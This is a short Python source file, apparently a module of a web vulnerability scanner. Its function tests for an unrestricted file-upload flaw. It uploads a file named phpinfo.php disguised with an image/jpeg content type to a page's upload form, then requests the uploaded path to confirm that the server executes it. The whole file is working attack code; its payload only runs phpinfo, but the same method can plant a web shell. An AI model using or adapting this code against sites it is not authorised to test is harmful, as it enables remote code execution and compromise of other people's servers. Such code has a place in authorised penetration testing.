
import requests
from bs4 import BeautifulSoup
import os
from requests_toolbelt import MultipartEncoder


def mode_fupload(url):
    # path = "/upload/"
    current_path = os.getcwd()
    absolute_path = current_path + '\\payload\\unload\\phpinfo.jpg'
    response = requests.get(url)
    if not 'uploadfile' in response.text:
        return False, url
    payload = {
        'uploadfile': ('phpinfo.php', open(absolute_path, 'rb'), 'image/jpeg'),
        "submit":  "开始上传",
    }

    m = MultipartEncoder(payload)
    headers = {
        'Content-Type': m.content_type
    }
    try:
        r = requests.post(url, headers=headers, data=m)
        soup = BeautifulSoup(r.text, 'html.parser')

        input_box = soup.find('input')
        upload_box = soup.find('upload')
        if input_box or upload_box :
            last_dir = url.rsplit('/', 1)[0]
            url = last_dir + "/uploads/phpinfo.php"
            resp2 = requests.post(url)
            if "PHP Version" in resp2.text:
                return True, url, payload, 'file_upload_yes!'
            else:
                return False, url
        else:
            return False, url

    except:
        return False, url

